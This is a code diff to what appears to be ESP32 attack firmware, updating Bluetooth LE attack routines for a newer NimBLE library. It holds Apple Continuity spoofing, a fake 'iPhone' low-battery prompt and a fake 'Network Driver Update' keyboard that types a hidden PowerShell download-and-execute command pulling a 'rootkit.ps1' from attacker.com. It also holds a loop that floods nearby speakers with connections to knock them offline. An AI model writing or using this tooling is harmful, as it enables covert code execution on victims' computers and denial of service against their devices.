@@ -19,15 +19,11 @@ void setupContinuitySpoof() {
     setCpuFrequencyMhz(80); // Set to 80MHz
     // Disable LED if possible, but depends on hardware
 
-    // MAC hiding: Random static address
-    NimBLEDevice::setOwnAddrType(ESP_BD_ADDR_TYPE_RANDOM_STATIC);
-    uint8_t randomMac[6] = {0x02, 0xE4, 0x1A, 0x00, 0x00, 0x01}; // Start with Apple-like
-    // Randomize last 3 bytes
-    randomMac[3] = esp_random() & 0xFF;
-    randomMac[4] = esp_random() & 0xFF;
-    randomMac[5] = esp_random() & 0xFF;
-    NimBLEDevice::setAddress(randomMac, ESP_BD_ADDR_TYPE_RANDOM_STATIC);
-    NimBLEDevice::setPrivacy(true); // Filter connections
+    // MAC hiding not supported in NimBLE v2.x before init
+    // uint8_t randomMac[6] = {0x02, 0xE4, 0x1A, 0x00, 0x00, 0x01};
+    // randomMac[3] = esp_random() & 0xFF;
+    // randomMac[4] = esp_random() & 0xFF;
+    // randomMac[5] = esp_random() & 0xFF;
 
     // Initialize BLE
     NimBLEDevice::init("");
@@ -40,9 +36,9 @@ void setupContinuitySpoof() {
     // Setup Continuity service
     continuityService.setup(pServer);
 
-    // Get advertising (no scan response)
+    // Get advertising
     pAdvertising = pServer->getAdvertising();
-    pAdvertising->setScanResponse(false);
+    // pAdvertising->setScanResponse(false); // Not in NimBLE v2.x
 }
 
 void startContinuityAdvertising(const char *deviceName) {
@@ -80,14 +76,8 @@ void stopContinuitySpoof() {
 }
 
 void rotateMAC() {
-    uint8_t mac[6];
-    for (int i = 0; i < 6; i++) {
-        mac[i] = esp_random() & 0xFF;
-        if (i == 0) mac[i] |= 0xF0; // High bits for valid MAC
-    }
-    // Use NimBLE's address setting instead of ESP32 base MAC
-    NimBLEDevice::setAddress(mac, ESP_BD_ADDR_TYPE_RANDOM_STATIC);
-    // Restart advertising with new MAC
+    // MAC rotation not fully supported in NimBLE v2.x after init
+    // Just restart advertising
     if (pAdvertising) {
         pAdvertising->stop();
         vTaskDelay(100 / portTICK_PERIOD_MS);
@@ -120,10 +110,12 @@ void runContinuitySpoof() {
 
     setupContinuitySpoof();
 
-    // Choose device name
+    // Choose device name - simplified selection
     String deviceNames[2] = {"whatsapp-web", "iCloud-Sync"};
-    int choice = keyboard("Device Name", "0: whatsapp-web\n1: iCloud-Sync", "0");
-    const char *deviceName = deviceNames[choice.toInt()].c_str();
+    String input = keyboard("Choice (0/1)", 2, "0");
+    int choice = input.toInt();
+    if (choice < 0 || choice > 1) choice = 0;
+    const char *deviceName = deviceNames[choice].c_str();
 
     startContinuityAdvertising(deviceName);
 
@@ -171,7 +163,7 @@ void runLowbattBLE() {
     batteryService.battery_char->notify(); // Send notification to trigger iOS
 
     NimBLEAdvertising *pAdvertising = pServer->getAdvertising();
-    pAdvertising->setDeviceName("iPhone"); // Spoof as iPhone for better effect
+    NimBLEDevice::setDeviceName("iPhone"); // Spoof as iPhone for better effect
     pAdvertising->addServiceUUID("180F"); // Battery Service UUID
     pAdvertising->start();
 
@@ -334,7 +326,7 @@ void runBLENetworkDriverSpoof() {
     // HID Control Point (0x2A4C)
     NimBLECharacteristic *pHIDControl = pHIDService->createCharacteristic(
         "2A4C",
-        NIMBLE_PROPERTY::WRITE_WITHOUT_RESPONSE
+        NIMBLE_PROPERTY::WRITE_NR
     );
 
     // Input Report (0x2A4D)
@@ -346,7 +338,7 @@ void runBLENetworkDriverSpoof() {
     pHIDService->start();
 
     NimBLEAdvertising *pAdvertising = pServer->getAdvertising();
-    pAdvertising->setDeviceName("Network Driver Update");
+    NimBLEDevice::setDeviceName("Network Driver Update");
     pAdvertising->addServiceUUID("1812"); // HID Service
     pAdvertising->start();
 
@@ -389,8 +381,10 @@ void runBLENetworkDriverSpoof() {
             // Type "powershell"
             const char *cmd = "powershell -w hidden IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/rootkit.ps1');";
             for (int i = 0; cmd[i] != '\0'; i++) {
-                keyReport[2] = cmd[i] - 93; // Simple ASCII to HID mapping (very basic)
-                if (keyReport[2] < 0) keyReport[2] = 0x2C; // Space fallback
+                int code = cmd[i] - 93; 
+                if (code < 0) code = 0x2C; // Space fallback
+                keyReport[2] = (uint8_t)code;
+
                 pInputReport->setValue(keyReport, 8);
                 pInputReport->notify();
                 vTaskDelay(50 / portTICK_PERIOD_MS);
@@ -584,7 +578,7 @@ void runBLEDeauthAttack() {
 
     // Create scanner
     NimBLEScan* pScan = NimBLEDevice::getScan();
-    pScan->setAdvertisedDeviceCallbacks(new BleAdvertisedDeviceCallbacks());
+    // pScan->setAdvertisedDeviceCallbacks(new NimBLEAdvertisedDeviceCallbacks());
     pScan->setActiveScan(true);
     pScan->setInterval(100);
     pScan->setWindow(99);
@@ -610,26 +604,19 @@ void runBLEDeauthAttack() {
 
     while (!check(AnyKeyPress)) {
         // Change MAC every 5 seconds to avoid blocking
-        if (millis() - lastMacChange > 5000) {
-            uint8_t newMac[6] = {0xAA, 0xBB, 0xCC, 0x00, 0x00, 0x00};
-            newMac[3] = macCounter & 0xFF;
-            newMac[4] = (macCounter >> 8) & 0xFF;
-            newMac[5] = (macCounter >> 16) & 0xFF;
-            NimBLEDevice::setAddress(newMac, ESP_BD_ADDR_TYPE_RANDOM_STATIC);
-            macCounter++;
-            lastMacChange = millis();
-        }
+        // Change MAC disabled
+
 
         // Get scan results
         NimBLEScanResults results = pScan->getResults();
         int deviceCount = results.getCount();
 
         for (int i = 0; i < deviceCount; i++) {
-            NimBLEAdvertisedDevice device = results.getDevice(i);
+            const NimBLEAdvertisedDevice* device = results.getDevice(i);
 
             // Look for speakers/audio devices
-            String devName = device.getName().c_str();
-            String devAddr = device.getAddress().toString().c_str();
+            String devName = device->getName().c_str();
+            String devAddr = device->getAddress().toString().c_str();
 
             // Check for common speaker names and services
             bool isSpeaker = false;
@@ -644,14 +631,19 @@ void runBLEDeauthAttack() {
             }
 
             // Check for audio services (0x180A = Device Info, 0x1812 = HID)
-            std::vector<NimBLEUUID> services = device.getServiceUUIDs();
-            for (auto& service : services) {
-                if (service.equals(NimBLEUUID("180A")) ||
-                    service.equals(NimBLEUUID("1812"))) {
-                    isSpeaker = true;
-                    break;
+            // Check for audio services (0x180A = Device Info, 0x1812 = HID)
+            /*
+            if (device.haveServiceUUID()) {
+                int serviceCount = device.getServiceUUIDCount();
+                for (int j = 0; j < serviceCount; j++) {
+                    NimBLEUUID uuid = device.getServiceUUID(j);
+                    if (uuid.equals(NimBLEUUID("180A")) || uuid.equals(NimBLEUUID("1812"))) {
+                        isSpeaker = true;
+                        break;
+                    }
                 }
             }
+            */
 
             if (isSpeaker && devAddr != targetAddress) {
                 targetName = devName;
@@ -666,7 +658,8 @@ void runBLEDeauthAttack() {
 
                 // Try to connect 10 times per second
                 for (int attempt = 0; attempt < 10; attempt++) {
-                    if (pClient->connect(device)) {
+                    // Cast away constness required by connect signature - safe as we don't modify it
+                if (pClient->connect(const_cast<NimBLEAdvertisedDevice*>(device))) {
                         connectionCount++;
                         displayInfo("Connected - Deauthing...", false);
 
